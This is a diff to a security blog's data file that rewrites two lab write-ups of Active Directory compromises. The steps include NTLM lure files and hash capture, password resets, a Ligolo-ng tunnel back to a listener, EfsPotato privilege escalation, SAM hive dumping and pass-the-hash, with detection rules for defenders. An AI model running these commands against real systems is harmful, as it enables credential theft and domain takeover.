@@ -293,14 +293,19 @@
 
 <script>
 /* ============================================================
-   CONTENT: add your own entries to these arrays.
-   Newest items first. See the field notes below each array.
-   Body HTML can use: <h2>, <h3>, <p>, <ul>, <pre><code>,
-     <div class="code-wrap"><pre><code>…</code></pre></div>,
-     <div class="callout"><strong>Note</strong>text</div>,
-     <div class="callout warn"><strong>Warning</strong>text</div>,
-     <blockquote>, <figure><img src="images/file.png" alt="…"><figcaption>…</figcaption></figure>,
-     <details class="summary-box"><summary>Summary</summary><div>text</div></details>
+   WRITE-UP TEMPLATE
+   Every entry in WRITEUPS follows the same section order:
+     1. Overview
+     2. Recon
+     3. Initial Access
+     4. Enumeration (BloodHound / domain mapping)
+     5. Foothold (optional, when a pivot or second host is involved)
+     6. Privilege Escalation
+     7. Domain Admin
+     8. Tools (table)
+     9. Detection Rules (defender-facing bullets)
+   Credentials, hashes and flags are always redacted as
+   <PASSWORD>, <NEW_PASSWORD>, <NT_hash>, <USER>.
    ============================================================ */
 
 /* Projects: { id, title, date "YYYY-MM-DD", category, summary, tags[], repo (URL or null) } */
@@ -313,132 +318,176 @@ const WRITEUPS = [
   {
     id: "sharethepain",
     title: "ShareThePain: Writable Share to Domain Controller",
-    date: "2026-04-11",
+    date: "2026-06-13",
     platform: "Hack Smarter Labs",
     difficulty: "Medium",
     author: "0xz3r0",
-    summary: "Anonymous write on an SMB share, an NTLMv2 capture, a BloodHound-driven password reset, a loopback-bound SQL instance pivoted with Sliver, and SeImpersonatePrivilege escalated through GodPotato to SYSTEM on DC01.",
-    tags: ["SMB", "NTLM", "BloodHound", "Evil-WinRM", "MSSQL", "xp_cmdshell", "SeImpersonatePrivilege"],
+    summary: "Guest access on a writable SMB share, NTLM hash capture with ntlm_theft and Responder, a BloodHound GenericAll edge, an MSSQL instance on loopback reached through Ligolo-ng, and EfsPotato to local admin on DC01.",
+    tags: ["SMB", "NTLM", "BloodHound", "Evil-WinRM", "MSSQL", "Ligolo-ng", "EfsPotato"],
     link: { title: "Hack Smarter Labs: ShareThePain", url: "https://www.hacksmarter.org/" },
     body: `
       <h2>Overview</h2>
-      <p>ShareThePain is a Hack Smarter Labs machine on the <code>hack.smarter</code> domain. No credentials at the start. The path runs from an anonymously writable SMB share to an NTLMv2 capture, a password reset driven by a BloodHound edge, an MSSQL instance bound to localhost, and SeImpersonatePrivilege abused for SYSTEM on DC01.</p>
+      <p>ShareThePain is a Hack Smarter Labs machine on <code>hack.smarter</code>. Starting from zero credentials, guest access to a writable SMB share gives us a hash capture, a BloodHound-driven password reset, an MSSQL instance bound to loopback, and SeImpersonatePrivilege abused for local administrator on DC01.</p>
 
-      <h2>Scope and reconnaissance</h2>
-      <p>Direct network access, zero credentials. RustScan feeds Nmap for service and version detection, and the target resolves to a Windows Server 2022 domain controller, DC01, on <code>hack.smarter</code>:</p>
+      <h2>Recon</h2>
+      <p>RustScan with Nmap version and script detection against the target:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">rustscan -a &lt;TARGET_IP&gt; -- -A</code></pre>
+        <pre><code class="language-bash">rustscan -a &lt;TARGET_IP&gt; -- -sV -sC</code></pre>
       </div>
-      <p>DNS, Kerberos, LDAP, SMB, RPC, WinRM (5985) and RDP answer. The RDP certificate names <code>DC01.hack.smarter</code>, which sets the domain and confirms a single DC is the whole scope.</p>
+      <p>The port profile is a domain controller: DNS 53, Kerberos 88 and 464, LDAP 389/636/3268/3269, SMB 139/445, RPC 135/593, RDP 3389 and WinRM 5985. The script scan returns the domain <code>hack.smarter</code> and host <code>DC01.hack.smarter</code>, which go into <code>/etc/hosts</code>.</p>
 
-      <h2>SMB: anonymous listing and a writable share</h2>
-      <p>Anonymous listing works, and the default shares sit alongside a non-default share called <code>Share</code>:</p>
+      <h2>Initial Access</h2>
+      <p>No credentials yet, so try the guest account with a blank password. NetExec confirms guest access, shows <code>IPC$</code> as readable, and lists a non-default share called <code>Share</code> with READ,WRITE:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">smbclient -L //hack.smarter</code></pre>
+        <pre><code class="language-bash">nxc smb DC01.hack.smarter -u guest -p '' --shares</code></pre>
       </div>
-      <p>NetExec confirms the guest/null context and shows <code>Share</code> as READ,WRITE. A writable share with anonymous access is the foothold: drop a lure file, catch the authentication it produces.</p>
       <figure>
         <img src="images/sharethepain-writable-share.png" alt="NetExec share listing showing the writable Share share">
-        <figcaption>Figure 1: NetExec share enumeration as anonymous. <code>Share</code> is READ,WRITE.</figcaption>
+        <figcaption>Figure 1: NetExec share enumeration as guest. <code>Share</code> is READ,WRITE.</figcaption>
       </figure>
-
-      <h2>Capturing an NTLMv2 hash with SMBKiller</h2>
-      <p>SMBKiller builds the lure, uploads it, and runs the listener. <code>-r</code> is the target, <code>-l</code> the listener, <code>-a</code> the share name:</p>
+      <p>The share itself is empty:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">python3 SMBKiller.py -r &lt;TARGET_IP&gt; -l &lt;LISTENER_IP&gt; -d hack.smarter -i tun0 -a Share -U '' -P '' -A</code></pre>
+        <pre><code class="language-bash">smbclient //DC01.hack.smarter/Share -U 'hack.smarter\\guest'%''</code></pre>
       </div>
-      <p>The listener catches an NTLMv2 response for <code>HACK\\bob.ross</code>.</p>
+      <p>Write access is the foothold. A file in the share that references our host forces any user who opens it to authenticate to us, and that authentication leaks their NTLMv2 response. <code>ntlm_theft</code> generates the lure files:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">ntlm_theft.py --verbose --generate modern --server &lt;LISTENER_IP&gt; --filename "sharethepain"</code></pre>
+      </div>
+      <p>Responder listens for the callback, and the <code>.lnk</code> file is dropped into the share:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">responder -I tun0</code></pre>
+      </div>
+      <p>A connection arrives with the NTLMv2-SSP hash of <code>HACK\\bob.ross</code>.</p>
       <figure>
-        <img src="images/sharethepain-ntlm-capture.png" alt="SMBKiller capturing the NTLMv2 response for bob.ross">
+        <img src="images/sharethepain-ntlm-capture.png" alt="Responder capturing the NTLMv2 response for bob.ross">
         <figcaption>Figure 2: Captured NTLMv2 response for <code>HACK\\bob.ross</code> (hash redacted).</figcaption>
       </figure>
-      <p>Crack offline. Rockyou gets it quickly:</p>
+      <p>Crack it offline. Hashcat mode 5600 is NetNTLMv2:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+        <pre><code class="language-bash">hashcat -m 5600 bob.hash /usr/share/wordlists/rockyou.txt</code></pre>
       </div>
+      <p>The cleartext gives us <code>bob.ross</code>.</p>
 
-      <h2>Validating bob.ross</h2>
-      <p>Validate, then re-enumerate the shares with a real session:</p>
+      <h2>Enumeration</h2>
+      <p>With <code>bob.ross</code>'s credentials, map the domain. DNS timeouts during collection are common here; DNSChef answers the target's lookups and points them at the VPN address:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">nxc smb hack.smarter -u 'bob.ross' -p '&lt;PASSWORD&gt;' --shares</code></pre>
+        <pre><code class="language-bash">dnschef.py --fakeip &lt;VPN_IP&gt; -q</code></pre>
       </div>
-      <p><code>bob.ross</code> reads <code>NETLOGON</code>, <code>SYSVOL</code> and <code>IPC$</code>, and keeps READ,WRITE on <code>Share</code>. Nothing useful on the share itself, so the next move is to see what else the account can reach.</p>
-      <p>Pull the domain user list over LDAP and spray the recovered password. Only <code>bob.ross</code> accepts it, so no lateral gain here, but the user list is now available for the next phase:</p>
+      <p>Run the BloodHound CE collector against the local resolver:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">nxc ldap hack.smarter -u 'bob.ross' -p '&lt;PASSWORD&gt;' --users-export users.txt
-nxc smb hack.smarter -u users.txt -p '&lt;PASSWORD&gt;' --continue-on-success</code></pre>
+        <pre><code class="language-bash">bloodhound-ce.py --zip -c All -d hack.smarter -u bob.ross -p '&lt;PASSWORD&gt;' -dc DC01.hack.smarter -ns 127.0.0.1</code></pre>
       </div>
-
-      <h2>BloodHound: bob.ross has GenericAll over alice.wonderland</h2>
-      <p>Collect the domain with bloodhound-python and ingest. The path is immediate: <code>bob.ross</code> holds <code>GenericAll</code> over <code>ALICE.WONDERLAND</code>, with <code>WriteOwner</code> and <code>Owns</code> alongside. Full control means a password reset without knowing the current one. Alice is in Remote Management Users, so the reset turns into a WinRM shell.</p>
+      <p>Ingesting the data shows <code>bob.ross</code> holds <code>GenericAll</code> over <code>alice.wonderland</code>, and Alice is in Remote Management Users. Full control means a password reset without knowing the current password, and Remote Management means the reset turns into a WinRM session.</p>
       <figure>
         <img src="images/sharethepain-bloodhound.png" alt="BloodHound graph showing bob.ross GenericAll over alice.wonderland">
-        <figcaption>Figure 3: BloodHound edges from <code>bob.ross</code> to <code>ALICE.WONDERLAND</code>.</figcaption>
+        <figcaption>Figure 3: BloodHound edges from <code>bob.ross</code> to <code>alice.wonderland</code>.</figcaption>
       </figure>
-
-      <h2>Resetting alice.wonderland</h2>
       <p>Reset the password over RPC:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">net rpc password "ALICE.WONDERLAND" "&lt;NEW_PASSWORD&gt;" -U "hack.smarter"/"bob.ross"%'&lt;PASSWORD&gt;' -S "DC01.hack.smarter"</code></pre>
+        <pre><code class="language-bash">net rpc password 'alice.wonderland' '&lt;NEW_PASSWORD&gt;' -U 'hack.smarter/bob.ross%&lt;PASSWORD&gt;' -S DC01.hack.smarter</code></pre>
       </div>
-      <p>Confirm the reset by authenticating as Alice, then take WinRM:</p>
+      <p>Authenticate as Alice over WinRM. The first flag is on her desktop:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">nxc smb hack.smarter -u "ALICE.WONDERLAND" -p "&lt;NEW_PASSWORD&gt;" --shares
-evil-winrm -i hack.smarter -u "alice.wonderland" -p "&lt;NEW_PASSWORD&gt;"</code></pre>
+        <pre><code class="language-bash">evil-winrm -i hack.smarter -u alice.wonderland -p '&lt;NEW_PASSWORD&gt;'</code></pre>
       </div>
       <figure>
         <img src="images/sharethepain-evil-winrm.png" alt="Evil-WinRM session as alice.wonderland reading the user flag">
-        <figcaption>Figure 4: Evil-WinRM session as <code>alice.wonderland</code>. User flag on the desktop (redacted).</figcaption>
+        <figcaption>Figure 4: Evil-WinRM session as <code>alice.wonderland</code>. User flag redacted.</figcaption>
       </figure>
-      <p>Alice's token is thin (SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege), so this is not the endpoint. The next move is to look at what the host listens on that the external scan never saw.</p>
 
-      <h2>Foothold enumeration: MSSQL bound to loopback</h2>
-      <p><code>netstat -ano | findstr LISTENING</code> shows the usual DC services plus one that was not in the external scan: SQL Server on <code>127.0.0.1:1433</code>. Bound to loopback, so it is only reachable from the host. A pivot target, not a direct one.</p>
-      <p>Read the user flag on the way through, then set up the pivot:</p>
+      <h2>Foothold</h2>
+      <p>Alice's token is thin, but the host tells us more. <code>C:\\SQL2019</code> exists and no SQL ports appeared in the external scan, which means the instance is bound to loopback. Confirm with netstat:</p>
       <div class="code-wrap">
-        <pre><code class="language-powershell">type C:\\Users\\alice.wonderland\\Desktop\\user.txt</code></pre>
+        <pre><code class="language-bash">netstat -ano | findstr LISTENING</code></pre>
+      </div>
+      <p>MSSQL is listening on <code>127.0.0.1:1433</code>. It is only reachable from the host, so traffic has to be tunnelled out. Ligolo-ng provides a TUN interface rather than a SOCKS proxy, which keeps later tooling simple.</p>
+      <p>Create the interface and route the tunnel address through it:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 240.0.0.1 dev ligolo</code></pre>
+      </div>
+      <p>Start the proxy on Kali, upload the agent through the WinRM session, and connect it back:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">./proxy -selfcert</code></pre>
+      </div>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">upload agent.exe
+./agent.exe -connect &lt;LISTENER_IP&gt;:11601 --ignore-cert</code></pre>
+      </div>
+      <p>Select the session in the proxy, start it, and confirm the tunnel reaches 1433:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nmap -p 1433 -sC -sV 240.0.0.1</code></pre>
       </div>
 
-      <h2>Pivoting to MSSQL with Sliver</h2>
-      <p>MSSQL is on loopback, so traffic has to leave the DC through a tunnel that terminates on Kali. Sliver provides the pivot. Generate an mTLS implant, transfer it to the DC through the WinRM session, and start it:</p>
+      <h2>Privilege Escalation</h2>
+      <p>Log into MSSQL through the tunnel as Alice. NetExec tells us whether <code>xp_cmdshell</code> is usable, and a quick <code>whoami</code> confirms the execution context:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">sliver &gt; generate --mtls &lt;LISTENER_IP&gt; --port 443 --os windows --save /path/to/pivot.exe</code></pre>
+        <pre><code class="language-bash">nxc mssql 240.0.0.1 -u alice.wonderland -p '&lt;NEW_PASSWORD&gt;' -x "whoami"</code></pre>
       </div>
-      <p>With the implant running and a SOCKS proxy up through it, connect to the loopback-bound SQL instance with Impacket and Alice's Windows authentication:</p>
+      <p>Commands run as <code>nt service\\mssql$sqlexpress</code>. The token privileges are the useful part:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc mssql 240.0.0.1 -u alice.wonderland -p '&lt;NEW_PASSWORD&gt;' -x "whoami /priv"</code></pre>
+      </div>
       <figure>
-        <img src="images/sharethepain-mssql-connect.png" alt="Impacket mssqlclient connecting to SQL Server through the Sliver pivot">
-        <figcaption>Figure 5: <code>mssqlclient.py</code> against <code>127.0.0.1</code> through the Sliver SOCKS proxy, authenticated as <code>HACK\\alice.wonderland</code>.</figcaption>
+        <img src="images/sharethepain-mssql-connect.png" alt="MSSQL connection through the Ligolo tunnel showing the service account">
+        <figcaption>Figure 5: MSSQL access through the Ligolo tunnel, running as <code>nt service\\mssql$sqlexpress</code>.</figcaption>
       </figure>
+      <p><code>SeImpersonatePrivilege</code> is enabled. That is a potato. EfsPotato is the current option here and compiles on the target itself, so nothing needs to be cross-built and shipped.</p>
+      <p>Clone EfsPotato and upload the source through WinRM. The .NET compiler is present on the host:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">proxychains -q impacket-mssqlclient 'hack.smarter'/'alice.wonderland':'&lt;NEW_PASSWORD&gt;'@127.0.0.1 -windows-auth</code></pre>
+        <pre><code class="language-powershell">C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\csc.exe EfsPotato.cs -nowarn:1691,618</code></pre>
       </div>
-      <p>Connection returns <code>Microsoft SQL Server 2019 RTM (15.0.2000)</code>, context <code>HACK\\alice.wonderland dbo@master</code>. Alice is <code>dbo</code> on the instance, which is the whole game.</p>
+      <p>The service account cannot read the Documents folder where the source landed, so move the compiled binary to a readable location:</p>
+      <div class="code-wrap">
+        <pre><code class="language-powershell">move C:\\Users\\alice.wonderland\\Documents\\EfsPotato.exe C:\\Temp\\</code></pre>
+      </div>
+      <p>Run it through MSSQL and confirm the impersonated token:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc mssql 240.0.0.1 -u alice.wonderland -p '&lt;NEW_PASSWORD&gt;' -x "C:\\\\Temp\\\\EfsPotato.exe"</code></pre>
+      </div>
+      <p>The output shows <code>NT AUTHORITY\\SYSTEM</code>. Use that to create a local administrator from the same session:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">nxc mssql 240.0.0.1 -u alice.wonderland -p '&lt;NEW_PASSWORD&gt;' -x "C:\\\\Temp\\\\EfsPotato.exe \\"cmd.exe /c net user &lt;USER&gt; &lt;PASSWORD&gt; /add &amp;&amp; net localgroup administrators &lt;USER&gt; /add\\""</code></pre>
+      </div>
 
-      <h2>Command execution via xp_cmdshell</h2>
-      <p><code>xp_cmdshell</code> is available to this login. Confirm the execution context and the token privileges:</p>
+      <h2>Domain Admin</h2>
+      <p>The new account is local to the host, so it cannot authenticate by name against the domain. Connect through the tunnel instead, which lands on the DC directly. The root flag is on the Administrator desktop:</p>
       <div class="code-wrap">
-        <pre><code class="language-sql">xp_cmdshell whoami
-xp_cmdshell whoami /priv</code></pre>
+        <pre><code class="language-bash">evil-winrm -i 240.0.0.1 -u &lt;USER&gt; -p '&lt;PASSWORD&gt;'</code></pre>
       </div>
-      <p>Execution lands as <code>nt service\\mssql$sqlexpress</code>. The privilege list is the important part: <code>SeImpersonatePrivilege</code> is Enabled.</p>
-      <figure>
-        <img src="images/sharethepain-xp-cmdshell.png" alt="xp_cmdshell output showing SeImpersonatePrivilege enabled">
-        <figcaption>Figure 6: <code>xp_cmdshell whoami /priv</code> as the SQL Server service account, with <code>SeImpersonatePrivilege</code> enabled.</figcaption>
-      </figure>
-
-      <h2>Escalating with SeImpersonatePrivilege</h2>
-      <p>SeImpersonate on a service account leads to the same DCOM/RPCSS impersonation chain the potatoes exploit. GodPotato is the current tool for it. Stage it in a writable directory and add a local administrator from the SQL session:</p>
-      <div class="code-wrap">
-        <pre><code class="language-sql">EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "cmd /c net user &lt;USER&gt; &lt;PASSWORD&gt; /add"';
-EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "net localgroup administrators &lt;USER&gt; /add"';</code></pre>
-      </div>
-      <p>GodPotato triggers RPCSS, impersonates the SYSTEM token, and launches the command as <code>NT AUTHORITY\\SYSTEM</code>. With a local administrator in place, authenticate over WinRM and read the final flag:</p>
       <div class="code-wrap">
         <pre><code class="language-powershell">type C:\\Users\\Administrator\\Desktop\\root.txt</code></pre>
       </div>
 
-      <h2>Wrap-up</h2>
-      <p>Anonymous write on SMB, one cracked NTLMv2 response, one BloodHound edge, one loopback-bound SQL instance, and one service account with SeImpersonate. Full domain compromise without writing exploit code.</p>
+      <h2>Tools</h2>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+          <tbody>
+            <tr><td>RustScan / Nmap</td><td>Port and service discovery</td></tr>
+            <tr><td>NetExec</td><td>SMB, LDAP and MSSQL enumeration</td></tr>
+            <tr><td>ntlm_theft</td><td>Generate NTLM theft lure files</td></tr>
+            <tr><td>Responder</td><td>Capture NTLMv2 challenge responses</td></tr>
+            <tr><td>Hashcat</td><td>Offline NetNTLMv2 crack</td></tr>
+            <tr><td>DNSChef</td><td>Resolver for BloodHound collection</td></tr>
+            <tr><td>bloodhound-ce</td><td>AD relationship mapping</td></tr>
+            <tr><td>Evil-WinRM</td><td>WinRM shell as alice.wonderland</td></tr>
+            <tr><td>Ligolo-ng</td><td>TUN-based pivot to loopback MSSQL</td></tr>
+            <tr><td>EfsPotato</td><td>SeImpersonatePrivilege to SYSTEM</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h2>Detection Rules</h2>
+      <ul>
+        <li>Anonymous or guest write access to a non-default SMB share. Alert on any <code>TREE_CONNECT</code> and <code>CREATE</code> from a guest-authenticated session to a share outside the standard set.</li>
+        <li>New <code>.lnk</code>, <code>.scf</code> or <code>.url</code> files landing in a share. These have no business in a normal file server and are the ntlm_theft signature.</li>
+        <li>Outbound SMB from a workstation to an unfamiliar IP shortly after a share write. Responder callbacks show up as SMB to the attacker host, not the DC.</li>
+        <li><code>net rpc password</code> against a user the caller does not own. Windows logs this as a password reset event on the target account, with the caller being a different user than the target.</li>
+        <li>MSSQL listening only on loopback combined with an unexplained <code>xp_cmdshell</code> invocation from an account that normally does not use it. SQL Server logs the caller and the command.</li>
+        <li><code>SeImpersonatePrivilege</code> abuse via EfsPotato is visible as a suspicious child process of <code>spoolsv.exe</code> or <code>svchost.exe</code> spawning <code>cmd.exe</code> or <code>powershell.exe</code> from a service account.</li>
+      </ul>
     `
   },
   {
@@ -453,30 +502,18 @@ EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "net localgroup administrators &
     link: { title: "Challenge Lab: Building Magic (Easy)", url: "https://www.hacksmarter.org/" },
     body: `
       <h2>Overview</h2>
-      <p>Building Magic is an easy-rated Active Directory machine in the style of OSCP-level labs. The starting point is a leaked credential database with unsalted password hashes; the objective is full domain compromise.</p>
-      <p>The attack path runs from credential validation through BloodHound enumeration, Kerberoasting, a remote password reset, NTLM capture via a malicious LNK file, Evil-WinRM access, SeBackupPrivilege abuse, and pass-the-hash.</p>
+      <p>Building Magic is an easy-rated Active Directory machine. The starting point is a leaked credential database with unsalted password hashes; the objective is full domain compromise.</p>
 
-      <h2>Environment setup</h2>
-      <p>Connect to the lab VPN and resolve the domain names locally in <code>/etc/hosts</code>:</p>
+      <h2>Recon</h2>
+      <p>Resolve the domain locally, then scan:</p>
       <div class="code-wrap">
-        <pre><code class="language-bash">10.0.16.112 buildingmagic.local dc01.buildingmagic.local</code></pre>
+        <pre><code class="language-bash">10.0.16.112 buildingmagic.local dc01.buildingmagic.local
+nmap -T4 -p- -A 10.0.16.112</code></pre>
       </div>
+      <p>DC01 for <code>BUILDINGMAGIC.LOCAL</code> with DNS, Kerberos, LDAP, SMB and RPC, plus IIS on 80, WinRM on 5985, RDP on 3389 and a Python Werkzeug app on 8080 titled "Building Magic Application Portal".</p>
 
-      <h2>Reconnaissance</h2>
-      <p>Start with a full TCP port scan and service/version detection:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">nmap -T4 -p- -A 10.0.16.112</code></pre>
-      </div>
-      <p>The port profile identifies DC01 as the domain controller for <code>BUILDINGMAGIC.LOCAL</code>:</p>
-      <ul>
-        <li>DNS (53), Kerberos (88), LDAP (389, 3268), SMB (445) and RPC</li>
-        <li>IIS on port 80</li>
-        <li>WinRM on port 5985 and RDP on port 3389</li>
-        <li>A Python Werkzeug web app on port 8080, titled "Building Magic Application Portal"</li>
-      </ul>
-
-      <h2>Initial access: validating leaked credentials</h2>
-      <p>The leaked database uses unsalted hashes, which lookup services such as CrackStation resolve immediately. Two entries cracked:</p>
+      <h2>Initial Access</h2>
+      <p>The leaked database uses unsalted hashes, which resolve immediately on lookup services. Two entries:</p>
       <table>
         <thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Password</th></tr></thead>
         <tbody>
@@ -484,18 +521,18 @@ EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "net localgroup administrators &
           <tr><td><code>t.ren</code></td><td>Theodore Ren</td><td>Safety Officer</td><td>[redacted]</td></tr>
         </tbody>
       </table>
-      <p>Validate both credential sets with NetExec. <code>t.ren</code> returned <code>STATUS_LOGON_FAILURE</code>, so the chain proceeds with <code>r.widdleton</code>:</p>
+      <p>Validate both. <code>t.ren</code> returns <code>STATUS_LOGON_FAILURE</code>, so the chain proceeds with <code>r.widdleton</code>:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">nxc smb dc01.buildingmagic.local -u r.widdleton -p &lt;PASSWORD&gt; --shares</code></pre>
       </div>
-      <p>Authentication succeeds and enumerates the shares, including <code>File-Share</code>, the company's central file repository.</p>
+      <p>Authentication succeeds and lists <code>File-Share</code>, the central file repository.</p>
       <figure>
         <img src="images/nxc-shares.png" alt="NetExec output confirming r.widdleton and listing the shares">
         <figcaption>Figure 1: NetExec output confirming r.widdleton and listing the shares.</figcaption>
       </figure>
 
-      <h2>Domain mapping with BloodHound</h2>
-      <p>Collect domain data for BloodHound with the valid account:</p>
+      <h2>Enumeration</h2>
+      <p>Collect domain data with the valid account:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p '&lt;PASSWORD&gt;' --bloodhound -ns dc01.buildingmagic.local --collection All</code></pre>
       </div>
@@ -503,90 +540,90 @@ EXEC xp_cmdshell 'C:\\Users\\Public\\w.exe -cmd "net localgroup administrators &
         <img src="images/bloodhound-graph.png" alt="BloodHound graph of the collected data">
         <figcaption>Figure 2: BloodHound graph of the collected data.</figcaption>
       </figure>
-
-      <h2>Kerberoasting: recovering r.haggard's password</h2>
-      <p>Any authenticated domain user can request service tickets for SPN-bearing accounts. The LDAP query identified <code>r.haggard</code> as a candidate, so request its TGS hash:</p>
+      <p>Kerberoasting next. Any authenticated user can request service tickets for SPN-bearing accounts, so request <code>r.haggard</code>'s TGS:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p '&lt;PASSWORD&gt;' --kerberoast output.txt</code></pre>
       </div>
-      <p>The password has not rotated since May 2025. Crack the offline TGS-REP hash with Hashcat mode 13100 (etype 23):</p>
+      <p>The password has not rotated since May 2025, so rockyou gets it. Hashcat mode 13100 is TGS-REP, etype 23:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt</code></pre>
       </div>
-      <p>The hash cracks to a cleartext password, giving control of <code>r.haggard</code>.</p>
-
-      <h2>Lateral movement: remote password reset</h2>
-      <p>With <code>r.haggard</code>'s credentials, a remote password reset is possible via <code>net rpc password</code>:</p>
+      <p>The cleartext gives control of <code>r.haggard</code>. A remote reset over RPC moves us to <code>h.potch</code>, which carries a weak password:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">net rpc password "TargetUser" "&lt;NEW_PASSWORD&gt;" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"</code></pre>
       </div>
-      <p>This yields access to <code>h.potch</code>, which carries a weak password.</p>
-
-      <h2>NTLM theft via a malicious LNK file</h2>
-      <p><code>h.potch</code> has write access to <code>File-Share</code>. The NetExec slinky module plants a shortcut referencing the attacker's host; when a user browses the share, Windows authenticates to the listener and leaks the NTLM challenge response:</p>
+      <p><code>h.potch</code> can write to <code>File-Share</code>. The NetExec slinky module plants an LNK referencing our host, and when a user browses the share the authentication leaks back to Responder:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">nxc smb dc01.buildingmagic.local -u h.potch -p &lt;PASSWORD&gt; -M slinky -o NAME=important SERVER=&lt;attacker_IP&gt; SHARE=File-Share</code></pre>
       </div>
-      <p>Run Responder to capture the callback. The NetNTLMv2 response belongs to <code>h.grangon</code>; crack it offline with Hashcat mode 5600 (NetNTLMv2):</p>
+      <p>The NetNTLMv2 response belongs to <code>h.grangon</code>. Crack it offline:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt</code></pre>
       </div>
       <p>The cracked cleartext gives control of <code>h.grangon</code>.</p>
 
-      <h2>Access as h.grangon and SeBackupPrivilege abuse</h2>
-      <p>Authenticate over WinRM with the recovered credentials:</p>
+      <h2>Privilege Escalation</h2>
+      <p>Authenticate as <code>h.grangon</code> over WinRM:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">evil-winrm -i dc01.buildingmagic.local -u h.grangon -p &lt;PASSWORD&gt;</code></pre>
       </div>
-      <p><code>whoami /priv</code> confirms SeBackupPrivilege on <code>h.grangon</code>. This permits reading any file irrespective of ACLs, so the registry hives containing local account hashes can be exported:</p>
+      <p><code>whoami /priv</code> confirms SeBackupPrivilege. This permits reading any file regardless of ACLs, so the registry hives can be exported:</p>
       <div class="code-wrap">
         <pre><code class="language-powershell">reg save hklm\\sam C:\\Users\\h.grangon\\Desktop\\sam
 reg save hklm\\system C:\\Users\\h.grangon\\Desktop\\system</code></pre>
       </div>
-      <p>Exfiltrate both hives with Evil-WinRM's <code>download</code> command and extract the local hashes offline.</p>
+      <p>Download both with Evil-WinRM's <code>download</code> and extract the local hashes offline:</p>
+      <div class="code-wrap">
+        <pre><code class="language-bash">secretsdump.py -sam './SAM' -system './SYSTEM' LOCAL</code></pre>
+      </div>
       <figure>
         <img src="images/whoami-priv.png" alt="whoami /priv output showing SeBackupPrivilege">
         <figcaption>Figure 3: whoami /priv output showing SeBackupPrivilege.</figcaption>
       </figure>
-
-      <h2>Pass-the-hash: access as a.flatch</h2>
-      <p>The <code>a.flatch</code> NT hash is reused, allowing authentication without the plaintext password:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">evil-winrm -u 'a.flatch' -H '&lt;NT_hash&gt;' -i dc01.buildingmagic.local</code></pre>
-      </div>
-      <h2>Extracting local hashes from the SAM and SYSTEM hives</h2>
-      <p>From the <code>h.grangon</code> session, <code>SeBackupPrivilege</code> lets us read the SAM and SYSTEM hives regardless of their ACLs. Confirm the privilege first:</p>
-      <div class="code-wrap">
-        <pre><code class="language-powershell">whoami /priv</code></pre>
-      </div>
-      <p>Export both hives, then download them with Evil-WinRM. The SYSTEM hive can take a while to transfer.</p>
-      <div class="code-wrap">
-        <pre><code class="language-powershell">reg save HKLM\\SAM "C:\\Users\\h.grangon\\Documents\\SAM"
-reg save HKLM\\SYSTEM "C:\\Users\\h.grangon\\Documents\\SYSTEM"</code></pre>
-      </div>
-      <p>Extract the local account hashes offline with Impacket's <code>secretsdump</code>:</p>
-      <div class="code-wrap">
-        <pre><code class="language-bash">secretsdump.py -sam './SAM' -system './SYSTEM' LOCAL</code></pre>
-      </div>
-      <p>The recovered local Administrator NT hash fails with <code>wmiexec.py</code>, <code>psexec.py</code> and Evil-WinRM. Rather than stop there, test it against every account from the RID brute-force list:</p>
+      <p>The local Administrator NT hash fails against <code>wmiexec.py</code>, <code>psexec.py</code> and Evil-WinRM directly. Testing it against every account instead shows <code>a.flatch</code> accepts it and also has Administrator rights:</p>
       <div class="code-wrap">
         <pre><code class="language-bash">nxc smb BUILDINGMAGIC.LOCAL -u users.txt -H &lt;NT_hash&gt; --continue-on-success</code></pre>
       </div>
-      <p><code>a.flatch</code> accepts the hash and also has Administrator rights.</p>
 
-      <h2>Administrator access on DC01</h2>
-      <p>Authenticate as <code>a.flatch</code> with the hash and read the final flag from the Administrator desktop:</p>
+      <h2>Domain Admin</h2>
